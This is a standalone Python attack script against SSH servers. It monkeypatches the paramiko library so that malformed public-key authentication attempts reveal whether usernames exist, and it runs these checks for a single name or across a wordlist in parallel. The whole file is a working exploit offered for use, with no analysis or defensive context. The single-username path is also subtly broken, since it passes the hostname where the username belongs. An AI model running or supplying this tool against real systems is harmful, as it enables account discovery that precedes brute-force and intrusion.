#!/usr/bin/python3
import multiprocessing
import threading
import time
import os
import argparse
import logging
import paramiko
import socket
import sys
import pdb

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t',dest='hostname', type=str, help='Single target')
arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
args = arg_parser.parse_args()
port = args.port
target = args.hostname

class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


def _paramiko_tunnel(username, *args, **kwargs):
    sock = socket.socket()
    sock.connect((target, port))
    us = username.strip()
    try:
        transport = paramiko.transport.Transport(sock)
    except socket.error:
        print ('[-] Failed to connect')
        return
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print ('[-] Failed to negotiate SSH transport')
        return
    try:
        transport.auth_publickey(us, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print ('[*] {} - Invalid username'.format(us))
    except paramiko.ssh_exception.AuthenticationException:
        print ('[+] {} - Valid username'.format(us))
        return


paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

if args.username is not None:
    username = args.username
    _paramiko_tunnel(target, port, username)

if args.wordlist is not None:
    usernames = []
    mp = []
    pool = multiprocessing.Pool(5)
    with open(args.wordlist) as f:
        for u in f:
            usernames.append(u)
        pool.map(_paramiko_tunnel, usernames)

        


